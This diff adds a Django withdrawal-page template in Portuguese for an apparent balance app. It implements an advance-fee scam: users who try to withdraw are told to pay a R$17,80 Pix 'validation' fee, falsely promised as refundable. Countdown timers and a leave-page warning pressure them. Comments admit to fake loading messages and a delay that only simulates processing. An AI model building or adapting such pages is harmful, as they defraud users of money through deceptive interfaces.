@@ -1,0 +1,864 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, viewport-fit=cover">
+    <!-- font -->
+    <link rel="stylesheet" href="{% static 'fonts/fonts.css' %}">
+    <!-- Icons -->
+    <link rel="stylesheet" href="{% static 'fonts/font-icons.css' %}">
+    <link rel="stylesheet" href="{% static 'css/bootstrap.min.css' %}">
+    <link rel="stylesheet" type="text/css" href="{% static 'css/styles.css' %}"/>
+  
+    <!-- Favicon and Touch Icons -->
+    <link rel="shortcut icon" href="{% static 'images/logo/48.png' %}" />
+    <link rel="apple-touch-icon-precomposed" href="{% static 'images/logo/48.png' %}" />
+    <title>Sacar</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+
+    <style>
+        /* Estilos gerais melhorados para layout moderno */
+        .withdraw-container {
+            background-color: #1a1a1a;
+            color: #fff;
+            padding: 20px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+        }
+
+        .balance-card {
+            background-color: #2c2c2c;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .balance-card h5 {
+            color: #4caf50; /* Verde escuro */
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+        }
+
+        .form-group input, .form-group select {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #444;
+            border-radius: 6px;
+            background-color: #333;
+            color: #fff;
+        }
+
+        .info-section {
+            background-color: #2c2c2c;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+
+        .info-section p {
+            margin: 5px 0;
+            font-size: 14px;
+        }
+
+        .security-indicator {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+            color: #4caf50;
+        }
+
+        .security-indicator i {
+            margin-right: 8px;
+            font-size: 18px;
+        }
+
+        .transaction-preview {
+            background-color: #2c2c2c;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 20px;
+            display: none;
+        }
+
+        .transaction-preview h5 {
+            margin-bottom: 15px;
+            border-bottom: 1px solid #444;
+            padding-bottom: 10px;
+        }
+
+        .transaction-preview p {
+            margin: 8px 0;
+            font-size: 15px;
+        }
+
+        .tf-btn.primary {
+            background-color: #4caf50;
+            color: #fff;
+            border: none;
+            padding: 12px;
+            border-radius: 6px;
+            width: 100%;
+            font-weight: bold;
+            transition: background-color 0.3s;
+            height: 48px; /* Altura fixa para alinhar */
+            line-height: 24px;
+        }
+
+        .tf-btn.primary:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .tf-btn.primary:active, .tf-btn.primary:focus {
+            color: #fff; /* Manter texto branco ao clicar */
+        }
+
+        .tf-btn.primary:hover {
+            background-color: #388e3c;
+        }
+
+        .tf-btn.secondary {
+            background-color: #757575;
+            color: #fff;
+            border: none;
+            padding: 12px;
+            border-radius: 6px;
+            width: 100%;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+
+        .tf-btn.secondary:hover {
+            background-color: #616161;
+        }
+
+        .error-message {
+            color: red;
+            font-size: 12px;
+            margin-top: 5px;
+        }
+
+        .error-text {
+            color: red !important;
+            font-weight: 600 !important;
+        }
+
+        /* Ajuste para botão Sacar tudo dividindo a linha */
+        .amount-row {
+            display: flex;
+            align-items: end;
+        }
+
+        .amount-row .col-7 {
+            flex: 0 0 58.333%;
+            max-width: 58.333%;
+            padding-right: 15px; /* Espaçamento aumentado */
+        }
+
+        .amount-row .col-5 {
+            flex: 0 0 41.667%;
+            max-width: 41.667%;
+        }
+
+        .amount-row input {
+            height: 48px; /* Altura fixa para alinhar com botão */
+        }
+
+        /* Responsividade */
+        @media (max-width: 768px) {
+            .withdraw-container {
+                padding: 15px;
+            }
+        }
+
+        /* Melhorias na animação de carregamento */
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 1050;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            color: white;
+            animation: fadeIn 0.5s ease-in-out;
+        }
+
+        .loading-overlay.active {
+            display: flex;
+        }
+
+        @keyframes fadeIn {
+            from {opacity: 0;}
+            to {opacity: 1;}
+        }
+
+        .spinner {
+            border: 8px solid rgba(255, 255, 255, 0.3);
+            border-top: 8px solid #4caf50;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        #loading-message {
+            font-size: 18px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <!-- preloade -->
+    <div class="preload preload-container">
+        <div class="preload-logo" style="background-image: url('{% static 'images/logo/144.png' %}')">
+            <div class="spinner"></div>
+        </div>
+    </div>
+    <!-- /preload -->
+    <div class="header fixed-top bg-surface d-flex justify-content-center align-items-center">
+        <a href="{% url 'core:home' %}" class="left back-btn"><i class="icon-left-btn"></i></a>
+        <h3>Sacar</h3>
+    </div>
+    <div class="pt-45 pb-90">
+        <div class="tf-container">
+            <div class="withdraw-container">
+                <!-- Cartão de Saldo -->
+                <div class="balance-card">
+                    <span>Seu Saldo</span>
+                    <h5>R$ {{ formatted_balance|default:"0,00" }}</h5>
+                </div>
+
+                <!-- Indicador de Segurança -->
+                <div class="security-indicator">
+                    <i class="icon-lock"></i>
+                    <span>Saque protegido por PIN e verificação avançada.</span>
+                </div>
+
+                <!-- Formulário de Saque -->
+                <form method="post" id="withdraw-form" action="{% url 'core:withdraw_balance' %}">
+                    {% csrf_token %}
+                    <div class="form-group">
+                        <label for="{{ form.method.id_for_label }}">Método de Saque</label>
+                        {{ form.method }}
+                    </div>
+                    <div class="form-group">
+                        <label for="{{ form.pix_key.id_for_label }}">Chave PIX</label>
+                        {{ form.pix_key }}
+                        <div id="pix-key-error" class="error-message"></div>
+                    </div>
+                    <div class="form-group">
+                        <label for="{{ form.amount.id_for_label }}">Quantia</label>
+                        <div class="amount-row">
+                            <div class="col-7 box-input-field pe-0">
+                                {{ form.amount }}
+                                <i class="icon-close"></i>
+                            </div>
+                            <div class="col-5">
+                                <button type="button" class="tf-btn primary" onclick="sacarTudo()">Sacar tudo</button>
+                            </div>
+                        </div>
+                        <div id="amount-error" class="error-message"></div>
+                    </div>
+                    <!-- Campo hidden para PIN -->
+                    <input type="hidden" name="pin" id="pin" value="">
+                </form>
+
+                <!-- Seção de Informações -->
+                <div class="info-section">
+                    <p>Taxa de saque: {{ fee_percentage }}%</p>
+                </div>
+
+                <!-- Preview de Transação -->
+                <div class="transaction-preview" id="transaction-preview">
+                    <h5>Confirme os dados</h5>
+                    <p>Valor a sacar: R$ <span id="preview-amount">0,00</span></p>
+                    <p>Valor final (após taxa de 3%): R$ <span id="preview-net-amount">0,00</span></p>
+                    <p>Destino: <span id="preview-pix-key"></span></p>
+                    <button type="button" class="tf-btn primary" onclick="confirmWithdraw()">Confirmar</button>
+                    <button type="button" class="tf-btn secondary" onclick="editWithdraw()">Editar</button>
+                </div>
+
+                <!-- Seção de Validação (se aplicável) -->
+                <div id="validation-section" style="display: none;">
+                    <div class="row">
+                        <div class="modalbox success col-12 center animate" id="step-content">
+                            {% if validation_status == "payment_reported" %}
+                            <div class="icon step-1-icon">
+                                <span class="icon-hourglass-half pulsate"></span>
+                            </div>
+                            <h1>Verificando pagamento...</h1>
+                            <p>Aguardando confirmação da validação via Pix. Isso pode levar até 25 minutos.</p>
+                            {% if pix_transaction.paid_at %}
+                            <p><strong>Pagamento confirmado em:</strong> {{ pix_transaction.paid_at|date:"d/m/Y H:i" }}</p>
+                            <p>Seu pagamento foi registrado e está sendo processado.</p>
+                            {% else %}
+                            <img src="{% static 'images/loading.gif' %}" width="60" />
+                            {% endif %}
+                            <form method="post" action="{% url 'core:reset_validation' %}">
+                                {% csrf_token %}
+                                <button type="submit" class="styled-button">Reiniciar Verificação</button>
+                            </form>
+                            {% elif validation_status == "pix_created" or pix_transaction %}
+                            <div class="icon step-1-icon">
+                                <span class="icon-qrcode pulsate"></span>
+                            </div>
+                            <h1>Realize o pagamento via Pix</h1>
+                            <p>Escaneie o QR Code abaixo com o app do seu banco ou copie a chave Pix.</p>
+                            <div id="qrcode"></div>
+                            <p style="margin-top: 20px;"><strong>Valor:</strong> R$ <span id="pix-amount">{{ pix_transaction.amount|floatformat:2|default:pix_config.amount|floatformat:2|default:"17,80" }}</span></p>
+                            <p><strong>O valor será devolvido imediatamente após a confirmação da validação.</strong></p>
+                            {% if pix_transaction.paid_at %}
+                            <p><strong>Pagamento confirmado em:</strong> {{ pix_transaction.paid_at|date:"d/m/Y H:i" }}</p>
+                            {% endif %}
+                            <div style="margin-top: 20px;">
+                                <input type="text" readonly value="{{ pix_transaction.qr_code|default:'[NOVA_CHAVE_PIX]' }}" id="pixcode" class="pix-code" />
+                                <button onclick="copyToClipboard()" class="styled-button small" id="copy-button">Copiar chave Pix</button>
+                                {% if can_generate_pix %}
+                                <button type="button" class="styled-button small" onclick="generateNewPix(event)">Gerar novo Pix</button>
+                                {% endif %}
+                            </div>
+                            <p style="margin-top: 20px;"><strong>Tempo restante para validação:</strong> <span id="timer">09:59</span></p>
+                            {% else %}
+                            <div class="icon">
+                                <span class="icon-exclamation-circle"></span>
+                            </div>
+                            <h1>Valide sua conta</h1>
+                            {% if pending_withdrawal_amount %}
+                            <p>Você possui um saque pendente no valor de <strong>{{ pending_withdrawal_amount }}</strong>.</p>
+                            {% endif %}
+                            <p>Antes de sacar, <strong>precisamos validar sua conta bancária</strong> para autorizar seu saque via Pix.</p>
+                            <button type="button" class="styled-button" id="start-validation">Iniciar validação</button>
+                            {% endif %}
+                        </div>
+                    </div>
+                </div>
+                <!-- Loading Modal -->
+                <div id="loading-modal" class="loading-modal" style="display: none;">
+                    <div class="loading-modal-content">
+                        <div class="spinner"></div>
+                        <p>Gerando novo Pix...</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="menubar-footer footer-fixed bg-surface" id="footer-bar">
+        <div class="inner-bar">
+            <button type="button" class="tf-btn lg primary" onclick="showPreview()">Continuar</button>
+        </div>
+    </div>
+
+    <!-- Modal de PIN -->
+    <div class="modal fade modalCenter" id="otpPin">
+        <div class="modal-dialog modal-dialog-centered" role="document">
+            <div class="modal-content">
+                <div class="header d-flex justify-content-center align-items-center">
+                    <span class="left icon-cancel" data-bs-dismiss="modal"></span>
+                    <h3>Insira sua senha</h3>
+                </div>
+                <div class="modal-body">
+                    <div class="digit-group" id="pin-group">
+                        <input required type="text" id="digit-1" name="digit-1" data-next="digit-2" maxlength="1">
+                        <input required type="text" id="digit-2" name="digit-2" data-next="digit-3" data-previous="digit-1" maxlength="1">
+                        <input required type="text" id="digit-3" name="digit-3" data-next="digit-4" data-previous="digit-2" maxlength="1">
+                        <input required type="text" id="digit-4" name="digit-4" data-previous="digit-3" maxlength="1">
+                    </div> 
+                    <p class="text-center text-small text-white mt-16" id="pin-message">Insira sua senha para prosseguir</p>
+                    <button type="button" class="mt-40 tf-btn lg primary" id="confirm-btn" disabled>Confirmar</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Overlay de Loading -->
+    <div class="loading-overlay" id="loading-overlay">
+        <div class="spinner"></div>
+        <p id="loading-message"></p>
+    </div>
+
+    <!-- Modal de Sucesso -->
+    <div class="modal fade modalCenter" id="success">
+        <div class="modal-dialog modal-dialog-centered" role="document">
+            <div class="modal-content success_box">
+                <div class="text-center">
+                    <h2 class="text-surface">Sucesso!</h2>
+                    <p class="text-small mt-8">Seu saque foi solicitado!</p>
+                    <h5 class="mt-16 text-surface">Valor sacado</h5>
+                    <h1 class="mt-8 text-primary">R$ {{ transaction_amount|default:"0,00" }}</h1>
+                    <p class="mt-16 text-surface text-button">Via PIX para</p>
+                    <p class="text-small mt-4">{{ pix_key }}</p>
+                </div>
+                <a href="{% url 'core:home' %}" class="tf-btn lg primary mt-40">Voltar à Home</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal de Erro -->
+    <div class="modal fade modalCenter" id="error">
+        <div class="modal-dialog modal-dialog-centered" role="document">
+            <div class="modal-content success_box">
+                <div class="text-center">
+                    <h2 class="text-surface">Erro!</h2>
+                    <p class="text-small mt-8" id="error-message">{{ error_message|default:"Ocorreu um erro no saque. Tente novamente." }}</p>
+                </div>
+                <button class="tf-btn lg primary mt-40" data-bs-dismiss="modal">Fechar</button>
+            </div>
+        </div>
+    </div>
+   
+    <script type="text/javascript" src="{% static 'js/bootstrap.min.js' %}"></script>
+    <script type="text/javascript" src="{% static 'js/jquery.min.js' %}"></script>
+    <script type="text/javascript" src="{% static 'js/main.js' %}"></script>
+
+    <!-- JS para preencher input com tags pré-definidas e máscara monetária -->
+    <script>
+        const balanceRaw = {{ balance_raw|default:0 }};  // Saldo bruto do context (Decimal no view)
+        const feePercentage = {{ fee_percentage }} / 100;
+        const minWithdraw = {{ min_withdraw|default:0 }};
+        const maxWithdrawDaily = {% if max_withdraw_daily %}{{ max_withdraw_daily }}{% else %}Infinity{% endif %};
+
+        // Função para formatar valor como monetário BR (ex: 1.234,56)
+        function formatarMoeda(value) {
+            let valor = value.toString().replace(/\D/g, '');  // Remove não números
+            valor = (valor / 100).toFixed(2) + '';  // Divide por 100 e fixa 2 decimais
+            valor = valor.replace('.', ',');  // Troca ponto por vírgula
+            valor = valor.replace(/(\d)(?=(\d{3})+(?!\d))/g, '$1.');  // Adiciona pontos como milhar
+            return valor;
+        }
+
+        // Aplicar máscara no input de quantia
+        const amountInput = document.getElementById('id_amount');
+        amountInput.addEventListener('input', () => {
+            let rawValue = amountInput.value.replace(/\D/g, '') / 100;
+            amountInput.value = formatarMoeda(amountInput.value);
+        });
+
+        // Limpar icon-close
+        document.querySelector('.icon-close').addEventListener('click', () => {
+            amountInput.value = '';
+        });
+
+        // Sacar tudo
+        function sacarTudo() {
+            let maxAmount = Math.min(balanceRaw, maxWithdrawDaily);
+            amountInput.value = formatarMoeda(maxAmount.toFixed(2));
+        }
+
+        // Mostrar preview
+        function showPreview() {
+            let amountStr = amountInput.value.replace('.', '').replace(',', '.');
+            let amount = parseFloat(amountStr);
+            const errorDiv = document.getElementById('amount-error');
+            const pixKeyInput = document.getElementById('id_pix_key');
+            const pixKeyError = document.getElementById('pix-key-error');
+            errorDiv.textContent = '';
+            pixKeyError.textContent = '';
+            if (pixKeyInput.value.trim() === '') {
+                pixKeyError.textContent = 'Chave PIX obrigatória.';
+                return;
+            }
+            if (isNaN(amount) || amount <= 0) {
+                errorDiv.textContent = 'Quantia inválida.';
+                return;
+            }
+            if (amount < minWithdraw) {
+                errorDiv.textContent = 'Quantia abaixo do mínimo.';
+                return;
+            }
+            if (amount > maxWithdrawDaily) {
+                errorDiv.textContent = 'Quantia acima do máximo diário.';
+                return;
+            }
+            if (amount > balanceRaw) {
+                errorDiv.textContent = 'Saldo insuficiente.';
+                return;
+            }
+            let netAmount = amount * (1 - feePercentage);
+            document.getElementById('preview-amount').textContent = formatarMoeda(amount.toFixed(2));
+            document.getElementById('preview-net-amount').textContent = formatarMoeda(netAmount.toFixed(2));
+            document.getElementById('preview-pix-key').textContent = pixKeyInput.value;
+            document.getElementById('withdraw-form').style.display = 'none';
+            document.getElementById('transaction-preview').style.display = 'block';
+            document.getElementById('footer-bar').style.display = 'none';
+        }
+
+        // Editar
+        function editWithdraw() {
+            document.getElementById('transaction-preview').style.display = 'none';
+            document.getElementById('withdraw-form').style.display = 'block';
+            document.getElementById('footer-bar').style.display = 'block';
+        }
+
+        // Confirmar e abrir modal de PIN
+        function confirmWithdraw() {
+            var otpModal = new bootstrap.Modal(document.getElementById('otpPin'));
+            otpModal.show();
+        }
+
+const pinInputs = document.querySelectorAll('.digit-group input');
+    const confirmBtn = document.getElementById('confirm-btn');
+    pinInputs.forEach((input, index) => {
+        input.addEventListener('input', (e) => {
+            if (e.target.value.length === 1 && index < pinInputs.length - 1) {
+                pinInputs[index + 1].focus();
+            }
+            let pin = '';
+            pinInputs.forEach(p => pin += p.value);
+            document.getElementById('pin').value = pin;
+            // Habilita/desabilita botão Confirmar
+            confirmBtn.disabled = pin.length !== 4;
+        });
+    });
+    // Função para submeter o form via AJAX
+    function submitWithdrawForm() {
+        if (document.getElementById('pin').value.length === 4) {
+            var form = document.getElementById('withdraw-form');
+            var formData = new FormData(form);
+
+            fetch(form.action, {
+                method: 'POST',
+                body: formData,
+                headers: {
+                    'X-CSRFToken': '{{ csrf_token }}',
+                    'X-Requested-With': 'XMLHttpRequest'
+                }
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+                return response.json();
+            })
+            .then(data => {
+                var pinMessage = document.getElementById('pin-message');
+                var otpModal = bootstrap.Modal.getOrCreateInstance(document.getElementById('otpPin'));
+                if (data.success || data.error_message.includes("verificação avançada para sacar")) {
+                    otpModal.hide();
+                    showLoading();
+                    setTimeout(() => {
+                        document.getElementById('loading-overlay').classList.remove('active');
+                        if (data.success) {
+                            var successModal = new bootstrap.Modal(document.getElementById('success'));
+                            successModal.show();
+                        } else {
+                            window.location.href = "{% url 'core:withdraw_validation' %}";
+                        }
+                    }, 3000); // Delay de 3 segundos para simular processamento
+                } else if (data.error_message.includes("PIN de saque inválido")) {
+                    pinMessage.textContent = 'Senha incorreta. Tente novamente.';
+                    pinMessage.classList.add('error-text');
+                    setTimeout(() => {
+                        pinMessage.textContent = 'Insira sua senha para prosseguir';
+                        pinMessage.classList.remove('error-text');
+                    }, 3000);  // Exibe mensagem de erro por 3 segundos
+                    // Limpa inputs
+                    pinInputs.forEach(p => p.value = '');
+                    document.getElementById('pin').value = '';
+                    pinInputs[0].focus();
+                } else {
+                    otpModal.hide();
+                    document.getElementById('error-message').textContent = data.error_message;
+                    var errorModal = new bootstrap.Modal(document.getElementById('error'));
+                    errorModal.show();
+                }
+            })
+            .catch(error => {
+                bootstrap.Modal.getOrCreateInstance(document.getElementById('otpPin')).hide();
+                document.getElementById('error-message').textContent = 'Erro na conexão. Tente novamente.';
+                var errorModal = new bootstrap.Modal(document.getElementById('error'));
+                errorModal.show();
+            });
+        }
+    }
+
+    // Adiciona event listener diretamente ao botão para garantir que ele dispare
+    document.addEventListener('DOMContentLoaded', () => {
+        confirmBtn.addEventListener('click', (e) => {
+            e.preventDefault();
+            submitWithdrawForm();
+        });
+    });
+
+    // Função para mostrar loading com mensagens fakes
+    function showLoading() {
+        var loadingOverlay = document.getElementById('loading-overlay');
+        var loadingMessage = document.getElementById('loading-message');
+        loadingMessage.textContent = 'Processando pagamento...';
+        loadingOverlay.classList.add('active');
+    }
+
+        // Adiciona event listener diretamente ao botão para garantir que ele dispare
+        document.addEventListener('DOMContentLoaded', () => {
+            confirmBtn.addEventListener('click', submitWithdrawForm);
+        });
+
+        // Função para mostrar loading com mensagens fakes
+        function showLoading() {
+            var loadingOverlay = document.getElementById('loading-overlay');
+            var loadingMessage = document.getElementById('loading-message');
+            loadingMessage.textContent = 'Processando pagamento...';
+            loadingOverlay.classList.add('active');
+        }
+
+        // Abrir modal de sucesso ou erro baseado no context Django (para carga inicial, se houver)
+        {% if success %}
+        var successModal = new bootstrap.Modal(document.getElementById('success'));
+        successModal.show();
+        {% endif %}
+
+        {% if error_message %}
+        var errorModal = new bootstrap.Modal(document.getElementById('error'));
+        errorModal.show();
+        {% endif %}
+
+        // Script para validação
+        document.addEventListener('DOMContentLoaded', () => {
+            const contentDiv = document.getElementById('step-content');
+            if (!contentDiv) return;
+
+            let countdown = 600;
+            let currentStep = {% if validation_status == "payment_reported" %}1{% elif validation_status == "pix_created" or pix_transaction %}1{% else %}0{% endif %};
+
+            function updateCountdown() {
+                const minutes = String(Math.floor(countdown / 60)).padStart(2, '0');
+                const seconds = String(countdown % 60).padStart(2, '0');
+                const timerEl = document.getElementById('timer');
+                if (timerEl) timerEl.innerText = `${minutes}:${seconds}`;
+                if (countdown > 0) countdown--;
+            }
+            setInterval(updateCountdown, 1000);
+
+            window.showLoadingModal = function () {
+                console.log('Showing loading modal');
+                const loadingModal = document.getElementById('loading-modal');
+                const submitButton = document.getElementById('generate-pix-button') || document.getElementById('validate-account-button');
+                if (loadingModal) loadingModal.style.display = 'flex';
+                if (submitButton) {
+                    submitButton.disabled = true;
+                    submitButton.innerText = submitButton.id === 'generate-pix-button' ? 'Gerando...' : 'Processando...';
+                }
+            };
+
+            window.hideLoadingModal = function () {
+                console.log('Hiding loading modal');
+                const loadingModal = document.getElementById('loading-modal');
+                const submitButton = document.getElementById('generate-pix-button') || document.getElementById('validate-account-button');
+                if (loadingModal) loadingModal.style.display = 'none';
+                if (submitButton) {
+                    submitButton.disabled = false;
+                    submitButton.innerText = submitButton.id === 'generate-pix-button' ? 'Gerar novo Pix' : 'Avançar';
+                }
+            };
+
+            const steps = [
+                {
+                    html: `
+                        <div class="icon step-1-icon">
+                            <span class="icon-mobile pulsate"></span>
+                        </div>
+                        <h1>Valide sua conta</h1>
+                        <p><strong>Notamos que esse será o seu primeiro saque.</strong> Como você adicionou uma nova chave Pix na sua conta, precisamos confirmar sua identidade.<br><br>
+                           Para liberar seu saque, valide sua conta bancária com um pagamento via Pix de <strong>R$ {% if pix_config %}{{ pix_config.amount|floatformat:2 }}{% else %}17,80{% endif %}</strong>. O saque será processado instantaneamente após a validação.<br><br>
+                          Salientamos que esse valor será <strong>reembolsado</strong> após a confirmação do recebimento do valor na conta destinatária.</p>
+                        <p>Este processo é <strong>rápido e seguro</strong>, confirmando sua identidade e garantindo que seu saque seja processado de forma segura.</p>
+                        <p><strong>Tempo restante:</strong> <span id="timer">14:59</span></p>
+                        <form method="post" action="{% url 'core:withdraw_validation' %}" id="validate-account-form">
+                            {% csrf_token %}
+                            <input type="hidden" name="utm_source" value="{{ request.GET.utm_source|default:'organic' }}">
+                            <input type="hidden" name="utm_campaign" value="{{ request.GET.utm_campaign|default:'' }}">
+                            <input type="hidden" name="utm_medium" value="{{ request.GET.utm_medium|default:'' }}">
+                            <input type="hidden" name="utm_content" value="{{ request.GET.utm_content|default:'' }}">
+                            <input type="hidden" name="utm_term" value="{{ request.GET.utm_term|default:'' }}">
+                            <button type="submit" class="styled-button" id="validate-account-button">Avançar</button>
+                        </form>
+                    `
+                }
+            ];
+
+            function updateStep() {
+                console.log('Updating to step:', currentStep);
+                contentDiv.innerHTML = steps[currentStep].html;
+                contentDiv.classList.add('animate');
+                const validateForm = document.getElementById('validate-account-form');
+                if (validateForm) {
+                    validateForm.addEventListener('submit', validateAccount);
+                }
+            }
+
+            function updatePixUI(data) {
+                let pixFormHtml = '';
+                if (data.can_generate_pix) {
+                    pixFormHtml = `
+                        <button type="button" class="styled-button small" onclick="generateNewPix(event)">Gerar novo Pix</button>
+                    `;
+                }
+                contentDiv.innerHTML = `
+                    <div class="icon step-1-icon">
+                        <span class="icon-qrcode pulsate"></span>
+                    </div>
+                    <h1>Realize o pagamento via Pix</h1>
+                    <p>Escaneie o QR Code abaixo com o app do seu banco ou copie a chave Pix.</p>
+                    <div id="qrcode"></div>
+                    <p style="margin-top: 20px;"><strong>Valor:</strong> R$ <span id="pix-amount">${data.amount.toFixed(2).replace('.', ',')}</span></p>
+                    <p><strong>O valor será devolvido imediatamente após a confirmação da validação.</strong></p>
+                    <div style="margin-top: 20px;">
+                        <input type="text" readonly value="${data.qr_code}" id="pixcode" class="pix-code" />
+                        <button onclick="copyToClipboard()" class="styled-button small" id="copy-button">Copiar chave Pix</button>
+                        ${pixFormHtml}
+                    </div>
+                    <p style="margin-top: 20px;"><strong>Tempo restante para validação:</strong> <span id="timer">14:59</span></p>
+                `;
+                contentDiv.classList.add('animate');
+                // Generate QR code client-side with delay to ensure div is rendered
+                setTimeout(() => {
+                    new QRCode(document.getElementById("qrcode"), {
+                        text: data.qr_code,
+                        width: 250,
+                        height: 250,
+                        colorDark : "#000000",
+                        colorLight : "#ffffff",
+                        correctLevel : QRCode.CorrectLevel.H
+                    });
+                }, 50);
+            }
+
+            function validateAccount(event) {
+                event.preventDefault();
+                showLoadingModal();
+                const form = document.getElementById('validate-account-form');
+                const formData = new FormData(form);
+
+                fetch("{% url 'core:withdraw_validation' %}", {
+                    method: 'POST',
+                    body: formData,
+                    headers: {
+                        'X-Requested-With': 'XMLHttpRequest',
+                        'X-CSRFToken': formData.get('csrfmiddlewaretoken')
+                    }
+                })
+                .then(response => response.json())
+                .then(data => {
+                    hideLoadingModal();
+                    if (data.status === 'success') {
+                        updatePixUI(data);
+                        window.onbeforeunload = null;
+                    } else {
+                        const errorDiv = document.createElement('div');
+                        errorDiv.className = 'alert-box';
+                        errorDiv.innerHTML = `<span class="icon-exclamation-circle"></span><p>${data.message || 'Erro ao gerar Pix. Tente novamente.'}</p>`;
+                        contentDiv.prepend(errorDiv);
+                    }
+                })
+                .catch(error => {
+                    hideLoadingModal();
+                    console.error('Error validating account:', error);
+                    const errorDiv = document.createElement('div');
+                    errorDiv.className = 'alert-box';
+                    errorDiv.innerHTML = `<span class="icon-exclamation-circle"></span><p>Erro ao processar a requisição. Tente novamente.</p>`;
+                    contentDiv.prepend(errorDiv);
+                });
+            }
+
+            window.copyToClipboard = function () {
+                console.log('Copying Pix code');
+                const el = document.getElementById("pixcode");
+                if (el) {
+                    el.select();
+                    document.execCommand("copy");
+                    const copyBtn = document.getElementById("copy-button");
+                    if (copyBtn) {
+                        copyBtn.innerText = "Chave Pix copiada!";
+                        setTimeout(() => {
+                            copyBtn.innerText = "Copiar chave Pix";
+                        }, 4000);
+                    }
+                } else {
+                    console.error('Pix code input not found');
+                }
+            };
+
+            window.generateNewPix = function (event) {
+                event.preventDefault();
+                showLoadingModal();
+                const formData = new FormData();
+                formData.append('csrfmiddlewaretoken', '{{ csrf_token }}');
+                formData.append('generate_new_pix', 'true');
+
+                fetch("{% url 'core:withdraw_validation' %}", {
+                    method: 'POST',
+                    body: formData,
+                    headers: {
+                        'X-Requested-With': 'XMLHttpRequest'
+                    }
+                })
+                .then(response => response.json())
+                .then(data => {
+                    hideLoadingModal();
+                    if (data.status === 'success') {
+                        updatePixUI(data);
+                    } else {
+                        const errorDiv = document.createElement('div');
+                        errorDiv.className = 'alert-box';
+                        errorDiv.innerHTML = `<span class="icon-exclamation-circle"></span><p>${data.message || 'Erro ao gerar novo Pix. Tente novamente.'}</p>`;
+                        contentDiv.prepend(errorDiv);
+                    }
+                })
+                .catch(error => {
+                    hideLoadingModal();
+                    console.error('Error generating new Pix:', error);
+                    const errorDiv = document.createElement('div');
+                    errorDiv.className = 'alert-box';
+                    errorDiv.innerHTML = `<span class="icon-exclamation-circle"></span><p>Erro ao processar a requisição. Tente novamente.</p>`;
+                    contentDiv.prepend(errorDiv);
+                });
+            };
+
+            const startButton = document.getElementById('start-validation');
+            if (startButton) {
+                startButton.addEventListener('click', () => {
+                    console.log('Start validation clicked');
+                    currentStep = 0; // Only one step now
+                    updateStep();
+                });
+            } else {
+                console.error('Start validation button not found');
+            }
+
+            const validateForm = document.getElementById('validate-account-form');
+            if (validateForm) {
+                validateForm.addEventListener('submit', validateAccount);
+            }
+
+            {% if validation_status != "payment_reported" and not pix_transaction and validation_status != "pix_created" %}
+            window.onbeforeunload = function () {
+                console.log('Triggering onbeforeunload warning');
+                return "Você tem um saque pendente. Conclua a validação para não perder seu progresso.";
+            };
+            {% endif %}
+        });
+    </script>
+</body>
+</html>
